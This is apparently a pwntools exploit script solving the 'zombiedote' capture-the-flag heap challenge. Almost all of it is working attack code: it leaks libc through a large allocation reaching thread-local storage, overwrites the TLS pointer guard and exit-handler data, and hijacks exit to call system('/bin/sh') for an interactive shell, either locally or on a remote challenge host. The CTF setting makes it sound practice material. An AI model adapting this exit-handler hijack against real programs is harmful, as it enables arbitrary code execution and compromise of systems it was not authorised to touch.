#!/usr/bin/env python3
from pwn import *
from struct import pack, unpack

from math import ceil

# =========================================================
#                          SETUP
# =========================================================
exe = './zombiedote'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set resolve-heap-via-heuristic force
    set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./zombiedote"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='zombiedote')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(size):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", str(ceil(size/0x8)).encode())

def insert(samples):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'Number of samples tested: ', str(len(samples)).encode())
    for sample in samples:
        io.sendlineafter(b'(%): ', str(sample).encode())

def delete():
    io.sendlineafter(b'>> ', b'3')

def edit(idx, data):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b": ", str(idx//8).encode())
    io.sendlineafter(b": ", str(data).encode())

def show(idx):
    io.sendlineafter(b">> ", b"5")
    io.sendlineafter(b": ", str(ceil(idx//8)).encode())
    io.recvuntil(b'(%): ')
    return float(io.recvline().decode())

def exploit():
    # 7rocky's solve script & write up https://7rocky.github.io/en/ctf/htb-challenges/pwn/zombiedote/
    global io
    io = initialize()
    with log.progress("Malloc big size to go tls & leak libc"), context.silent:
        alloc(0x22000) #Enter tls
        libc_leak = u64(pack("d", show(0x236f8))) #leak from tls
        libc.address = libc_leak - libc.sym['main_arena']
        tls = libc.address - 0x28c0 
        chunk =  tls - 0x23730
    log.info(f"Libc leak: %#x", libc_leak)
    log.info(f"Libc base: %#x", libc.address)
    log.info(f"TLS: %#x", tls)
    log.info(f"Chunk: %#x", chunk)

    with log.progress("Hijacking tls to control exit to ret2system"),context.silent:
        edit((tls - 0x58) - chunk, unpack('d', p64(chunk))[0]) #Overwrite the tls pointer
        edit((tls + 0x30) - chunk, 0) #Overwrite the cookie
        insert([
            unpack('d', p64(libc.sym.system << 17))[0],
            unpack('d', p64(next(libc.search(b'/bin/sh'))))[0],
        ])
        delete()
    io.interactive()

if __name__ == '__main__':
    exploit()
